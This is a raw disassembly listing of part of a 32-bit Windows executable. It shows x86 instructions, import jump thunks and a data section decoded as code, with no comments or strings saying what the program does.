  409e2e:	ff 35 8c ca 40 00    	push   0x40ca8c
  409e34:	e8 ef 89 ff ff       	call   0x402828
  409e39:	50                   	push   %eax
  409e3a:	e8 b5 f5 ff ff       	call   0x4093f4
  409e3f:	6a 00                	push   $0x0
  409e41:	68 e8 17 40 00       	push   $0x4017e8
  409e46:	a3 ac ca 40 00       	mov    %eax,0x40caac
  409e4b:	e8 a4 f5 ff ff       	call   0x4093f4
  409e50:	8b 35 d0 10 40 00    	mov    0x4010d0,%esi
  409e56:	50                   	push   %eax
  409e57:	ff 35 b0 ca 40 00    	push   0x40cab0
  409e5d:	ff d6                	call   *%esi
  409e5f:	68 00 10 00 00       	push   $0x1000
  409e64:	e8 10 89 ff ff       	call   0x402779
  409e69:	59                   	pop    %ecx
  409e6a:	8b d8                	mov    %eax,%ebx
  409e6c:	57                   	push   %edi
  409e6d:	53                   	push   %ebx
  409e6e:	ff d6                	call   *%esi
  409e70:	53                   	push   %ebx
  409e71:	ff d5                	call   *%ebp
  409e73:	ff 35 ac ca 40 00    	push   0x40caac
  409e79:	53                   	push   %ebx
  409e7a:	ff 15 70 10 40 00    	call   *0x401070
  409e80:	6a 0a                	push   $0xa
  409e82:	5e                   	pop    %esi
  409e83:	53                   	push   %ebx
  409e84:	e8 ae fc ff ff       	call   0x409b37
  409e89:	8b f8                	mov    %eax,%edi
  409e8b:	85 ff                	test   %edi,%edi
  409e8d:	74 0c                	je     0x409e9b
  409e8f:	68 e8 03 00 00       	push   $0x3e8
  409e94:	4e                   	dec    %esi
  409e95:	ff 15 50 10 40 00    	call   *0x401050
  409e9b:	85 f6                	test   %esi,%esi
  409e9d:	7e 04                	jle    0x409ea3
  409e9f:	85 ff                	test   %edi,%edi
  409ea1:	75 e0                	jne    0x409e83
  409ea3:	83 fe 01             	cmp    $0x1,%esi
  409ea6:	7d 07                	jge    0x409eaf
  409ea8:	6a 01                	push   $0x1
  409eaa:	e9 c9 fe ff ff       	jmp    0x409d78
  409eaf:	ff 35 28 19 40 00    	push   0x401928
  409eb5:	ff 35 94 ca 40 00    	push   0x40ca94
  409ebb:	e8 cd 88 ff ff       	call   0x40278d
  409ec0:	ff 35 28 19 40 00    	push   0x401928
  409ec6:	a3 94 ca 40 00       	mov    %eax,0x40ca94
  409ecb:	ff 35 44 11 40 00    	push   0x401144
  409ed1:	50                   	push   %eax
  409ed2:	e8 4e 87 ff ff       	call   0x402625
  409ed7:	ff 35 30 19 40 00    	push   0x401930
  409edd:	ff 35 90 ca 40 00    	push   0x40ca90
  409ee3:	e8 a5 88 ff ff       	call   0x40278d
  409ee8:	ff 35 30 19 40 00    	push   0x401930
  409eee:	a3 90 ca 40 00       	mov    %eax,0x40ca90
  409ef3:	ff 35 2c 19 40 00    	push   0x40192c
  409ef9:	50                   	push   %eax
  409efa:	e8 26 87 ff ff       	call   0x402625
  409eff:	83 c4 28             	add    $0x28,%esp
  409f02:	68 40 c6 40 00       	push   $0x40c640
  409f07:	ff 35 a4 ca 40 00    	push   0x40caa4
  409f0d:	e8 7d fa ff ff       	call   0x40998f
  409f12:	e8 1e f5 ff ff       	call   0x409435
  409f17:	5f                   	pop    %edi
  409f18:	5e                   	pop    %esi
  409f19:	5d                   	pop    %ebp
  409f1a:	5b                   	pop    %ebx
  409f1b:	e9 d5 f5 ff ff       	jmp    0x4094f5
  409f20:	e8 32 fd ff ff       	call   0x409c57
  409f25:	6a 00                	push   $0x0
  409f27:	ff 15 3c 10 40 00    	call   *0x40103c
  409f2d:	cc                   	int3
  409f2e:	55                   	push   %ebp
  409f2f:	8b ec                	mov    %esp,%ebp
  409f31:	51                   	push   %ecx
  409f32:	51                   	push   %ecx
  409f33:	53                   	push   %ebx
  409f34:	56                   	push   %esi
  409f35:	57                   	push   %edi
  409f36:	8b 7d 14             	mov    0x14(%ebp),%edi
  409f39:	33 c0                	xor    %eax,%eax
  409f3b:	68 b4 09 00 00       	push   $0x9b4
  409f40:	50                   	push   %eax
  409f41:	57                   	push   %edi
  409f42:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409f45:	89 45 f8             	mov    %eax,-0x8(%ebp)
  409f48:	e8 fa 86 ff ff       	call   0x402647
  409f4d:	83 c4 0c             	add    $0xc,%esp
  409f50:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409f53:	50                   	push   %eax
  409f54:	68 b2 09 00 00       	push   $0x9b2
  409f59:	57                   	push   %edi
  409f5a:	ff 75 0c             	push   0xc(%ebp)
  409f5d:	ff 75 08             	push   0x8(%ebp)
  409f60:	e8 86 a0 ff ff       	call   0x403feb
  409f65:	8b d8                	mov    %eax,%ebx
  409f67:	85 db                	test   %ebx,%ebx
  409f69:	75 3e                	jne    0x409fa9
  409f6b:	57                   	push   %edi
  409f6c:	ff 15 c0 10 40 00    	call   *0x4010c0
  409f72:	8b f0                	mov    %eax,%esi
  409f74:	66 c7 04 3e 0d 0a    	movw   $0xa0d,(%esi,%edi,1)
  409f7a:	83 c6 02             	add    $0x2,%esi
  409f7d:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  409f80:	74 22                	je     0x409fa4
  409f82:	53                   	push   %ebx
  409f83:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409f86:	50                   	push   %eax
  409f87:	56                   	push   %esi
  409f88:	57                   	push   %edi
  409f89:	ff 75 10             	push   0x10(%ebp)
  409f8c:	ff 15 b4 10 40 00    	call   *0x4010b4
  409f92:	85 c0                	test   %eax,%eax
  409f94:	74 09                	je     0x409f9f
  409f96:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409f99:	40                   	inc    %eax
  409f9a:	39 45 f8             	cmp    %eax,-0x8(%ebp)
  409f9d:	74 05                	je     0x409fa4
  409f9f:	6a fe                	push   $0xfffffffe
  409fa1:	58                   	pop    %eax
  409fa2:	eb 07                	jmp    0x409fab
  409fa4:	c6 44 3e fe 00       	movb   $0x0,-0x2(%esi,%edi,1)
  409fa9:	8b c3                	mov    %ebx,%eax
  409fab:	5f                   	pop    %edi
  409fac:	5e                   	pop    %esi
  409fad:	5b                   	pop    %ebx
  409fae:	8b e5                	mov    %ebp,%esp
  409fb0:	5d                   	pop    %ebp
  409fb1:	c2 10 00             	ret    $0x10
  409fb4:	ff 74 24 10          	push   0x10(%esp)
  409fb8:	ff 74 24 10          	push   0x10(%esp)
  409fbc:	6a 10                	push   $0x10
  409fbe:	ff 74 24 14          	push   0x14(%esp)
  409fc2:	e8 67 ff ff ff       	call   0x409f2e
  409fc7:	c2 10 00             	ret    $0x10
  409fca:	55                   	push   %ebp
  409fcb:	8d 6c 24 9c          	lea    -0x64(%esp),%ebp
  409fcf:	81 ec ec 07 00 00    	sub    $0x7ec,%esp
  409fd5:	8d 85 78 f8 ff ff    	lea    -0x788(%ebp),%eax
  409fdb:	56                   	push   %esi
  409fdc:	57                   	push   %edi
  409fdd:	68 00 04 00 00       	push   $0x400
  409fe2:	33 ff                	xor    %edi,%edi
  409fe4:	57                   	push   %edi
  409fe5:	50                   	push   %eax
  409fe6:	e8 5c 86 ff ff       	call   0x402647
  409feb:	68 00 02 00 00       	push   $0x200
  409ff0:	57                   	push   %edi
  409ff1:	ff 75 6c             	push   0x6c(%ebp)
  409ff4:	e8 4e 86 ff ff       	call   0x402647
  409ff9:	83 c4 18             	add    $0x18,%esp
  409ffc:	8d 45 b8             	lea    -0x48(%ebp),%eax
  409fff:	57                   	push   %edi
  40a000:	57                   	push   %edi
  40a001:	50                   	push   %eax
  40a002:	e8 e3 d3 ff ff       	call   0x4073ea
  40a007:	8d 85 78 fe ff ff    	lea    -0x188(%ebp),%eax
  40a00d:	50                   	push   %eax
  40a00e:	e8 16 c4 ff ff       	call   0x406429
  40a013:	8d 85 78 fc ff ff    	lea    -0x388(%ebp),%eax
  40a019:	50                   	push   %eax
  40a01a:	e8 37 c9 ff ff       	call   0x406956
  40a01f:	be 50 21 40 00       	mov    $0x402150,%esi
  40a024:	56                   	push   %esi
  40a025:	ff 15 c0 10 40 00    	call   *0x4010c0
  40a02b:	50                   	push   %eax
  40a02c:	56                   	push   %esi
  40a02d:	8d 85 78 fc ff ff    	lea    -0x388(%ebp),%eax
  40a033:	50                   	push   %eax
  40a034:	68 e5 69 40 00       	push   $0x4069e5
  40a039:	8d 85 78 fe ff ff    	lea    -0x188(%ebp),%eax
  40a03f:	50                   	push   %eax
  40a040:	e8 fa c3 ff ff       	call   0x40643f
  40a045:	8b f0                	mov    %eax,%esi
  40a047:	85 f6                	test   %esi,%esi
  40a049:	0f 85 87 00 00 00    	jne    0x40a0d6
  40a04f:	ff 75 70             	push   0x70(%ebp)
  40a052:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40a055:	6a 10                	push   $0x10
  40a057:	50                   	push   %eax
  40a058:	e8 18 9e ff ff       	call   0x403e75
  40a05d:	8b f0                	mov    %eax,%esi
  40a05f:	85 f6                	test   %esi,%esi
  40a061:	75 73                	jne    0x40a0d6
  40a063:	ff 75 74             	push   0x74(%ebp)
  40a066:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40a069:	6a 10                	push   $0x10
  40a06b:	50                   	push   %eax
  40a06c:	e8 04 9e ff ff       	call   0x403e75
  40a071:	8b f0                	mov    %eax,%esi
  40a073:	85 f6                	test   %esi,%esi
  40a075:	75 5f                	jne    0x40a0d6
  40a077:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40a07a:	50                   	push   %eax
  40a07b:	e8 a6 9d ff ff       	call   0x403e26
  40a080:	ff 75 7c             	push   0x7c(%ebp)
  40a083:	83 c0 07             	add    $0x7,%eax
  40a086:	ff 75 78             	push   0x78(%ebp)
  40a089:	c1 e8 03             	shr    $0x3,%eax
  40a08c:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40a08f:	8d 85 78 f8 ff ff    	lea    -0x788(%ebp),%eax
  40a095:	50                   	push   %eax
  40a096:	e8 8a 85 ff ff       	call   0x402625
  40a09b:	83 c4 0c             	add    $0xc,%esp
  40a09e:	8d 85 78 f8 ff ff    	lea    -0x788(%ebp),%eax
  40a0a4:	ff 75 6c             	push   0x6c(%ebp)
  40a0a7:	50                   	push   %eax
  40a0a8:	ff 75 7c             	push   0x7c(%ebp)
  40a0ab:	8d 85 78 fe ff ff    	lea    -0x188(%ebp),%eax
  40a0b1:	57                   	push   %edi
  40a0b2:	50                   	push   %eax
  40a0b3:	68 7a 66 40 00       	push   $0x40667a
  40a0b8:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40a0bb:	50                   	push   %eax
  40a0bc:	e8 98 d5 ff ff       	call   0x407659
  40a0c1:	8b f0                	mov    %eax,%esi
  40a0c3:	85 f6                	test   %esi,%esi
  40a0c5:	74 0f                	je     0x40a0d6
  40a0c7:	ff 75 7c             	push   0x7c(%ebp)
  40a0ca:	57                   	push   %edi
  40a0cb:	ff 75 6c             	push   0x6c(%ebp)
  40a0ce:	e8 74 85 ff ff       	call   0x402647
  40a0d3:	83 c4 0c             	add    $0xc,%esp
  40a0d6:	8d 85 78 fe ff ff    	lea    -0x188(%ebp),%eax
  40a0dc:	50                   	push   %eax
  40a0dd:	e8 7a c3 ff ff       	call   0x40645c
  40a0e2:	8d 85 78 fc ff ff    	lea    -0x388(%ebp),%eax
  40a0e8:	50                   	push   %eax
  40a0e9:	e8 9d c8 ff ff       	call   0x40698b
  40a0ee:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40a0f1:	50                   	push   %eax
  40a0f2:	e8 fa d6 ff ff       	call   0x4077f1
  40a0f7:	5f                   	pop    %edi
  40a0f8:	8b c6                	mov    %esi,%eax
  40a0fa:	5e                   	pop    %esi
  40a0fb:	8d 65 64             	lea    0x64(%ebp),%esp
  40a0fe:	5d                   	pop    %ebp
  40a0ff:	c2 14 00             	ret    $0x14
  40a102:	81 ec f4 03 00 00    	sub    $0x3f4,%esp
  40a108:	53                   	push   %ebx
  40a109:	55                   	push   %ebp
  40a10a:	56                   	push   %esi
  40a10b:	57                   	push   %edi
  40a10c:	bf 00 04 00 00       	mov    $0x400,%edi
  40a111:	33 db                	xor    %ebx,%ebx
  40a113:	57                   	push   %edi
  40a114:	53                   	push   %ebx
  40a115:	ff b4 24 10 04 00 00 	push   0x410(%esp)
  40a11c:	e8 26 85 ff ff       	call   0x402647
  40a121:	83 c4 0c             	add    $0xc,%esp
  40a124:	8d 84 24 c4 00 00 00 	lea    0xc4(%esp),%eax
  40a12b:	50                   	push   %eax
  40a12c:	e8 f8 c2 ff ff       	call   0x406429
  40a131:	8d 84 24 04 02 00 00 	lea    0x204(%esp),%eax
  40a138:	50                   	push   %eax
  40a139:	e8 18 c8 ff ff       	call   0x406956
  40a13e:	be 5c 21 40 00       	mov    $0x40215c,%esi
  40a143:	56                   	push   %esi
  40a144:	ff 15 c0 10 40 00    	call   *0x4010c0
  40a14a:	50                   	push   %eax
  40a14b:	56                   	push   %esi
  40a14c:	8d 84 24 0c 02 00 00 	lea    0x20c(%esp),%eax
  40a153:	50                   	push   %eax
  40a154:	68 e5 69 40 00       	push   $0x4069e5
  40a159:	8d 84 24 d4 00 00 00 	lea    0xd4(%esp),%eax
  40a160:	50                   	push   %eax
  40a161:	e8 d9 c2 ff ff       	call   0x40643f
  40a166:	8b f0                	mov    %eax,%esi
  40a168:	85 f6                	test   %esi,%esi
  40a16a:	0f 85 5d 01 00 00    	jne    0x40a2cd
  40a170:	53                   	push   %ebx
  40a171:	53                   	push   %ebx
  40a172:	8d 44 24 20          	lea    0x20(%esp),%eax
  40a176:	50                   	push   %eax
  40a177:	e8 6e d2 ff ff       	call   0x4073ea
  40a17c:	68 01 00 01 00       	push   $0x10001
  40a181:	57                   	push   %edi
  40a182:	8d 84 24 cc 00 00 00 	lea    0xcc(%esp),%eax
  40a189:	50                   	push   %eax
  40a18a:	68 7a 66 40 00       	push   $0x40667a
  40a18f:	8d 44 24 28          	lea    0x28(%esp),%eax
  40a193:	50                   	push   %eax
  40a194:	e8 84 d2 ff ff       	call   0x40741d
  40a199:	8b f0                	mov    %eax,%esi
  40a19b:	85 f6                	test   %esi,%esi
  40a19d:	0f 85 2a 01 00 00    	jne    0x40a2cd
  40a1a3:	ff b4 24 18 04 00 00 	push   0x418(%esp)
  40a1aa:	8d 44 24 24          	lea    0x24(%esp),%eax
  40a1ae:	ff b4 24 28 04 00 00 	push   0x428(%esp)
  40a1b5:	50                   	push   %eax
  40a1b6:	ff b4 24 20 04 00 00 	push   0x420(%esp)
  40a1bd:	e8 f2 fd ff ff       	call   0x409fb4
  40a1c2:	8b f0                	mov    %eax,%esi
  40a1c4:	f7 de                	neg    %esi
  40a1c6:	1b f6                	sbb    %esi,%esi
  40a1c8:	f7 de                	neg    %esi
  40a1ca:	0f 85 fd 00 00 00    	jne    0x40a2cd
  40a1d0:	8d 44 24 44          	lea    0x44(%esp),%eax
  40a1d4:	50                   	push   %eax
  40a1d5:	e8 89 9c ff ff       	call   0x403e63
  40a1da:	8b f8                	mov    %eax,%edi
  40a1dc:	57                   	push   %edi
  40a1dd:	89 7c 24 18          	mov    %edi,0x18(%esp)
  40a1e1:	e8 93 85 ff ff       	call   0x402779
  40a1e6:	57                   	push   %edi
  40a1e7:	8b e8                	mov    %eax,%ebp
  40a1e9:	53                   	push   %ebx
  40a1ea:	55                   	push   %ebp
  40a1eb:	e8 57 84 ff ff       	call   0x402647
  40a1f0:	83 c4 10             	add    $0x10,%esp
  40a1f3:	8d 44 24 44          	lea    0x44(%esp),%eax
  40a1f7:	57                   	push   %edi
  40a1f8:	55                   	push   %ebp
  40a1f9:	50                   	push   %eax
  40a1fa:	e8 00 a0 ff ff       	call   0x4041ff
  40a1ff:	85 c0                	test   %eax,%eax
  40a201:	0f 85 ca 00 00 00    	jne    0x40a2d1
  40a207:	8d 44 24 50          	lea    0x50(%esp),%eax
  40a20b:	50                   	push   %eax
  40a20c:	e8 52 9c ff ff       	call   0x403e63
  40a211:	50                   	push   %eax
  40a212:	89 44 24 14          	mov    %eax,0x14(%esp)
  40a216:	e8 5e 85 ff ff       	call   0x402779
  40a21b:	ff 74 24 14          	push   0x14(%esp)
  40a21f:	8b d8                	mov    %eax,%ebx
  40a221:	6a 00                	push   $0x0
  40a223:	53                   	push   %ebx
  40a224:	e8 1e 84 ff ff       	call   0x402647
  40a229:	83 c4 10             	add    $0x10,%esp
  40a22c:	8d 44 24 50          	lea    0x50(%esp),%eax
  40a230:	ff 74 24 10          	push   0x10(%esp)
  40a234:	53                   	push   %ebx
  40a235:	50                   	push   %eax
  40a236:	e8 c4 9f ff ff       	call   0x4041ff
  40a23b:	85 c0                	test   %eax,%eax
  40a23d:	0f 85 92 00 00 00    	jne    0x40a2d5
  40a243:	8b 74 24 10          	mov    0x10(%esp),%esi
  40a247:	03 f7                	add    %edi,%esi
  40a249:	8d 46 40             	lea    0x40(%esi),%eax
  40a24c:	50                   	push   %eax
  40a24d:	e8 27 85 ff ff       	call   0x402779
  40a252:	56                   	push   %esi
  40a253:	8b f8                	mov    %eax,%edi
  40a255:	6a 00                	push   $0x0
  40a257:	57                   	push   %edi
  40a258:	e8 ea 83 ff ff       	call   0x402647
  40a25d:	8b 74 24 24          	mov    0x24(%esp),%esi
  40a261:	56                   	push   %esi
  40a262:	55                   	push   %ebp
  40a263:	57                   	push   %edi
  40a264:	e8 bc 83 ff ff       	call   0x402625
  40a269:	ff 74 24 2c          	push   0x2c(%esp)
  40a26d:	8d 04 37             	lea    (%edi,%esi,1),%eax
  40a270:	53                   	push   %ebx
  40a271:	50                   	push   %eax
  40a272:	e8 ae 83 ff ff       	call   0x402625
  40a277:	8b 44 24 38          	mov    0x38(%esp),%eax
  40a27b:	6a 20                	push   $0x20
  40a27d:	ff b4 24 48 04 00 00 	push   0x448(%esp)
  40a284:	03 c7                	add    %edi,%eax
  40a286:	03 f0                	add    %eax,%esi
  40a288:	56                   	push   %esi
  40a289:	e8 97 83 ff ff       	call   0x402625
  40a28e:	6a 20                	push   $0x20
  40a290:	ff b4 24 58 04 00 00 	push   0x458(%esp)
  40a297:	8d 46 20             	lea    0x20(%esi),%eax
  40a29a:	50                   	push   %eax
  40a29b:	e8 85 83 ff ff       	call   0x402625
  40a2a0:	83 c4 40             	add    $0x40,%esp
  40a2a3:	68 c0 00 00 00       	push   $0xc0
  40a2a8:	57                   	push   %edi
  40a2a9:	ff b4 24 18 04 00 00 	push   0x418(%esp)
  40a2b0:	ff b4 24 18 04 00 00 	push   0x418(%esp)
  40a2b7:	ff b4 24 18 04 00 00 	push   0x418(%esp)
  40a2be:	e8 07 fd ff ff       	call   0x409fca
  40a2c3:	8b f0                	mov    %eax,%esi
  40a2c5:	f7 de                	neg    %esi
  40a2c7:	1b f6                	sbb    %esi,%esi
  40a2c9:	f7 de                	neg    %esi
  40a2cb:	eb 0c                	jmp    0x40a2d9
  40a2cd:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  40a2d1:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40a2d5:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40a2d9:	57                   	push   %edi
  40a2da:	e8 86 84 ff ff       	call   0x402765
  40a2df:	55                   	push   %ebp
  40a2e0:	e8 80 84 ff ff       	call   0x402765
  40a2e5:	53                   	push   %ebx
  40a2e6:	e8 7a 84 ff ff       	call   0x402765
  40a2eb:	83 c4 0c             	add    $0xc,%esp
  40a2ee:	8d 44 24 18          	lea    0x18(%esp),%eax
  40a2f2:	50                   	push   %eax
  40a2f3:	e8 f9 d4 ff ff       	call   0x4077f1
  40a2f8:	8d 84 24 c4 00 00 00 	lea    0xc4(%esp),%eax
  40a2ff:	50                   	push   %eax
  40a300:	e8 57 c1 ff ff       	call   0x40645c
  40a305:	8d 84 24 04 02 00 00 	lea    0x204(%esp),%eax
  40a30c:	50                   	push   %eax
  40a30d:	e8 79 c6 ff ff       	call   0x40698b
  40a312:	5f                   	pop    %edi
  40a313:	8b c6                	mov    %esi,%eax
  40a315:	5e                   	pop    %esi
  40a316:	5d                   	pop    %ebp
  40a317:	5b                   	pop    %ebx
  40a318:	81 c4 f4 03 00 00    	add    $0x3f4,%esp
  40a31e:	c2 20 00             	ret    $0x20
  40a321:	56                   	push   %esi
  40a322:	57                   	push   %edi
  40a323:	6a 08                	push   $0x8
  40a325:	e8 4f 84 ff ff       	call   0x402779
  40a32a:	59                   	pop    %ecx
  40a32b:	ff 74 24 10          	push   0x10(%esp)
  40a32f:	8b f0                	mov    %eax,%esi
  40a331:	e8 65 00 00 00       	call   0x40a39b
  40a336:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40a33a:	83 66 04 00          	andl   $0x0,0x4(%esi)
  40a33e:	57                   	push   %edi
  40a33f:	89 06                	mov    %eax,(%esi)
  40a341:	e8 47 00 00 00       	call   0x40a38d
  40a346:	85 c0                	test   %eax,%eax
  40a348:	75 05                	jne    0x40a34f
  40a34a:	8b 07                	mov    (%edi),%eax
  40a34c:	89 46 04             	mov    %eax,0x4(%esi)
  40a34f:	89 37                	mov    %esi,(%edi)
  40a351:	5f                   	pop    %edi
  40a352:	5e                   	pop    %esi
  40a353:	c2 08 00             	ret    $0x8
  40a356:	57                   	push   %edi
  40a357:	8b 7c 24 08          	mov    0x8(%esp),%edi
  40a35b:	57                   	push   %edi
  40a35c:	e8 2c 00 00 00       	call   0x40a38d
  40a361:	85 c0                	test   %eax,%eax
  40a363:	75 24                	jne    0x40a389
  40a365:	56                   	push   %esi
  40a366:	8b 37                	mov    (%edi),%esi
  40a368:	8b 46 04             	mov    0x4(%esi),%eax
  40a36b:	89 07                	mov    %eax,(%edi)
  40a36d:	ff 36                	push   (%esi)
  40a36f:	ff 74 24 14          	push   0x14(%esp)
  40a373:	ff 15 d0 10 40 00    	call   *0x4010d0
  40a379:	ff 36                	push   (%esi)
  40a37b:	e8 e5 83 ff ff       	call   0x402765
  40a380:	56                   	push   %esi
  40a381:	e8 df 83 ff ff       	call   0x402765
  40a386:	59                   	pop    %ecx
  40a387:	59                   	pop    %ecx
  40a388:	5e                   	pop    %esi
  40a389:	5f                   	pop    %edi
  40a38a:	c2 08 00             	ret    $0x8
  40a38d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40a391:	33 c0                	xor    %eax,%eax
  40a393:	39 01                	cmp    %eax,(%ecx)
  40a395:	0f 94 c0             	sete   %al
  40a398:	c2 04 00             	ret    $0x4
  40a39b:	56                   	push   %esi
  40a39c:	ff 74 24 08          	push   0x8(%esp)
  40a3a0:	ff 15 2c 10 40 00    	call   *0x40102c
  40a3a6:	8d 04 45 02 00 00 00 	lea    0x2(,%eax,2),%eax
  40a3ad:	50                   	push   %eax
  40a3ae:	e8 c6 83 ff ff       	call   0x402779
  40a3b3:	59                   	pop    %ecx
  40a3b4:	ff 74 24 08          	push   0x8(%esp)
  40a3b8:	8b f0                	mov    %eax,%esi
  40a3ba:	56                   	push   %esi
  40a3bb:	ff 15 d0 10 40 00    	call   *0x4010d0
  40a3c1:	8b c6                	mov    %esi,%eax
  40a3c3:	5e                   	pop    %esi
  40a3c4:	c2 04 00             	ret    $0x4
  40a3c7:	cc                   	int3
  40a3c8:	ff 25 f8 10 40 00    	jmp    *0x4010f8
  40a3ce:	ff 25 fc 10 40 00    	jmp    *0x4010fc
  40a3d4:	ff 25 00 11 40 00    	jmp    *0x401100
  40a3da:	ff 25 04 11 40 00    	jmp    *0x401104
  40a3e0:	ff 25 08 11 40 00    	jmp    *0x401108
  40a3e6:	ff 25 0c 11 40 00    	jmp    *0x40110c
  40a3ec:	cc                   	int3
  40a3ed:	cc                   	int3
  40a3ee:	cc                   	int3
  40a3ef:	cc                   	int3
  40a3f0:	ff                   	(bad)
  40a3f1:	ff                   	(bad)
  40a3f2:	ff                   	(bad)
  40a3f3:	ff 00                	incl   (%eax)
  40a3f5:	00 00                	add    %al,(%eax)
  40a3f7:	00 36                	add    %dh,(%esi)
  40a3f9:	8c 40 00             	mov    %es,0x0(%eax)
	...
  40cab8:	54                   	push   %esp
  40cab9:	cb                   	lret
	...
  40cac2:	00 00                	add    %al,(%eax)
  40cac4:	24 cf                	and    $0xcf,%al
  40cac6:	00 00                	add    %al,(%eax)
  40cac8:	24 10                	and    $0x10,%al
  40caca:	00 00                	add    %al,(%eax)
  40cacc:	30 cb                	xor    %cl,%bl
	...
  40cad6:	00 00                	add    %al,(%eax)
  40cad8:	c8 cf 00 00          	enter  $0xcf,$0x0
  40cadc:	00 10                	add    %dl,(%eax)
  40cade:	00 00                	add    %al,(%eax)
  40cae0:	0c cc                	or     $0xcc,%al
	...
  40caea:	00 00                	add    %al,(%eax)
  40caec:	fa                   	cli
  40caed:	cf                   	iret
  40caee:	00 00                	add    %al,(%eax)
  40caf0:	dc 10                	fcoml  (%eax)
  40caf2:	00 00                	add    %al,(%eax)
  40caf4:	18 cc                	sbb    %cl,%ah
	...
  40cafe:	00 00                	add    %al,(%eax)
  40cb00:	44                   	inc    %esp
  40cb01:	d0 00                	rolb   $1,(%eax)
  40cb03:	00 e8                	add    %ch,%al
  40cb05:	10 00                	adc    %al,(%eax)
  40cb07:	00 28                	add    %ch,(%eax)
  40cb09:	cc                   	int3
	...
  40cb12:	00 00                	add    %al,(%eax)
  40cb14:	7a d0                	jp     0x40cae6
  40cb16:	00 00                	add    %al,(%eax)
  40cb18:	f8                   	clc
  40cb19:	10 00                	adc    %al,(%eax)
	...
  40cb2f:	00 a2 cf 00 00 92    	add    %ah,-0x6dffff31(%edx)
  40cb35:	cf                   	iret
  40cb36:	00 00                	add    %al,(%eax)
  40cb38:	80 cf 00             	or     $0x0,%bh
  40cb3b:	00 72 cf             	add    %dh,-0x31(%edx)
  40cb3e:	00 00                	add    %al,(%eax)
  40cb40:	60                   	pusha
  40cb41:	cf                   	iret
  40cb42:	00 00                	add    %al,(%eax)
  40cb44:	4a                   	dec    %edx
  40cb45:	cf                   	iret
  40cb46:	00 00                	add    %al,(%eax)
  40cb48:	32 cf                	xor    %bh,%cl
  40cb4a:	00 00                	add    %al,(%eax)
  40cb4c:	b6 cf                	mov    $0xcf,%dh
  40cb4e:	00 00                	add    %al,(%eax)
  40cb50:	00 00                	add    %al,(%eax)
  40cb52:	00 00                	add    %al,(%eax)
  40cb54:	c0 cc 00             	ror    $0x0,%ah
  40cb57:	00 d4                	add    %dl,%ah
  40cb59:	cc                   	int3
  40cb5a:	00 00                	add    %al,(%eax)
  40cb5c:	e2 cc                	loop   0x40cb2a
  40cb5e:	00 00                	add    %al,(%eax)
  40cb60:	ee                   	out    %al,(%dx)
  40cb61:	cc                   	int3
  40cb62:	00 00                	add    %al,(%eax)
  40cb64:	fc                   	cld
  40cb65:	cc                   	int3
  40cb66:	00 00                	add    %al,(%eax)
  40cb68:	0a cd                	or     %ch,%cl
  40cb6a:	00 00                	add    %al,(%eax)
  40cb6c:	1e                   	push   %ds
  40cb6d:	cd 00                	int    $0x0
  40cb6f:	00 2c cd 00 00 3c cd 	add    %ch,-0x32c40000(,%ecx,8)
  40cb76:	00 00                	add    %al,(%eax)
  40cb78:	50                   	push   %eax
  40cb79:	cd 00                	int    $0x0
  40cb7b:	00 64 cd 00          	add    %ah,0x0(%ebp,%ecx,8)
  40cb7f:	00 7e cd             	add    %bh,-0x33(%esi)
  40cb82:	00 00                	add    %al,(%eax)
  40cb84:	86 cd                	xchg   %cl,%ch
  40cb86:	00 00                	add    %al,(%eax)
  40cb88:	9a cd 00 00 ac cd 00 	lcall  $0xcd,$0xac0000cd
  40cb8f:	00 b8 cd 00 00 c4    	add    %bh,-0x3bffff33(%eax)
  40cb95:	cd 00                	int    $0x0
  40cb97:	00 d0                	add    %dl,%al
  40cb99:	cd 00                	int    $0x0
  40cb9b:	00 b4 cc 00 00 e8 cd 	add    %dh,-0x32180000(%esp,%ecx,8)
  40cba2:	00 00                	add    %al,(%eax)
  40cba4:	f4                   	hlt
  40cba5:	cd 00                	int    $0x0
  40cba7:	00 0a                	add    %cl,(%edx)
  40cba9:	ce                   	into
  40cbaa:	00 00                	add    %al,(%eax)
  40cbac:	1c ce                	sbb    $0xce,%al
  40cbae:	00 00                	add    %al,(%eax)
  40cbb0:	36 ce                	ss into
  40cbb2:	00 00                	add    %al,(%eax)
  40cbb4:	46                   	inc    %esi
  40cbb5:	ce                   	into
  40cbb6:	00 00                	add    %al,(%eax)
  40cbb8:	56                   	push   %esi
  40cbb9:	ce                   	into
  40cbba:	00 00                	add    %al,(%eax)
  40cbbc:	6a ce                	push   $0xffffffce
  40cbbe:	00 00                	add    %al,(%eax)
  40cbc0:	80 ce 00             	or     $0x0,%dh
  40cbc3:	00 96 ce 00 00 a8    	add    %dl,-0x57ffff32(%esi)
  40cbc9:	ce                   	into
  40cbca:	00 00                	add    %al,(%eax)
  40cbcc:	b8 ce 00 00 c4       	mov    $0xc40000ce,%eax
  40cbd1:	ce                   	into
  40cbd2:	00 00                	add    %al,(%eax)
  40cbd4:	d2 ce                	ror    %cl,%dh
  40cbd6:	00 00                	add    %al,(%eax)
  40cbd8:	e6 ce                	out    %al,$0xce
  40cbda:	00 00                	add    %al,(%eax)
  40cbdc:	fc                   	cld
  40cbdd:	ce                   	into
  40cbde:	00 00                	add    %al,(%eax)
  40cbe0:	12 cf                	adc    %bh,%cl
  40cbe2:	00 00                	add    %al,(%eax)
  40cbe4:	a8 cc                	test   $0xcc,%al
  40cbe6:	00 00                	add    %al,(%eax)
  40cbe8:	98                   	cwtl
  40cbe9:	cc                   	int3
  40cbea:	00 00                	add    %al,(%eax)
  40cbec:	88 cc                	mov    %cl,%ah
  40cbee:	00 00                	add    %al,(%eax)
  40cbf0:	7c cc                	jl     0x40cbbe
  40cbf2:	00 00                	add    %al,(%eax)
  40cbf4:	6a cc                	push   $0xffffffcc
